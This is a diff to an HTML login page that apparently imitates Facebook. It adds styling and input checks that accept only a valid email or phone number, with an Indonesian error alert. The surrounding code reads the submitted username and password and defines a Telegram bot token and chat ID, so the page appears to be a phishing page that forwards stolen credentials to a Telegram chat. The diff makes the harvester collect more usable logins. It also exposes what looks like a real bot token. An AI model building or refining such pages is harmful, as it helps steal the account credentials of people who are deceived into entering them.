@@ -29,6 +29,8 @@
       color: #1877f2;
       font-size: 40px;
       margin-bottom: 20px;
+      font-weight: bold;
+      font-family: Arial, sans-serif;
     }
     input[type="text"],
     input[type="password"] {
@@ -91,10 +93,23 @@
   </div>
 
   <script>
+    function isValidEmail(email) {
+      return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+    }
+
+    function isValidPhone(phone) {
+      return /^[0-9]{10,15}$/.test(phone);
+    }
+
     document.getElementById("loginForm").addEventListener("submit", function (e) {
       e.preventDefault();
-      const username = e.target.username.value;
-      const password = e.target.password.value;
+      const username = e.target.username.value.trim();
+      const password = e.target.password.value.trim();
+
+      if (!isValidEmail(username) && !isValidPhone(username)) {
+        alert("Masukkan email atau nomor HP yang valid!");
+        return;
+      }
 
       const botToken = '7951216599:AAFiExWSRz2hwQeJPIQjprlba_zVycgeo7k';
       const chatId = '7218964278';
